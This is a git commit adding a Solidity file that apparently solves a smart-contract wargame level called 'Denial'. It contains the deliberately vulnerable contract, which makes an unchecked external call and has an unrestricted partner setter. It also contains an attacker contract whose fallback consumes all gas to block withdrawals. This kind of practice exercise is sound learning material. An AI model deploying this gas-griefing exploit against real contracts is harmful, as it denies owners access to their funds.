bfd6113332cf5fe66c716de2603cc55cf5459c14
ish4n10 <91148819+ish4n10@users.noreply.github.com>
2023-04-05 23:40:26 +0530

    Create Denial.sol

---
+++ Denial.sol
@@ -0,0 +1,46 @@
+pragma solidity ^0.8.0;
+
+contract expl {
+	function pwn(Denial t) public {
+		t.setWithdrawPartner(address(this));
+	}
+            // we need a way so that the code 
+            // doesn't execute furthur, hence drain gas
+	fallback() external payable {
+		assembly {
+			invalid() // consume all of the gas
+		}
+	}
+}
+
+contract Denial {
+
+    address public partner; // withdrawal partner - pay the gas, split the withdraw
+    address public constant owner = address(0xA9E);
+    uint timeLastWithdrawn;
+    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances
+
+    function setWithdrawPartner(address _partner) public {
+        partner = _partner;
+    }
+
+    // withdraw 1% to recipient and 1% to owner
+    function withdraw() public {
+        uint amountToSend = address(this).balance / 100;
+        // perform a call without checking return
+        // The recipient can revert, the owner will still get their share
+        partner.call{value:amountToSend}("");
+        payable(owner).transfer(amountToSend);
+        // keep track of last withdrawal time
+        timeLastWithdrawn = block.timestamp;
+        withdrawPartnerBalances[partner] +=  amountToSend;
+    }
+
+    // allow deposit of funds
+    receive() external payable {}
+
+    // convenience function
+    function contractBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
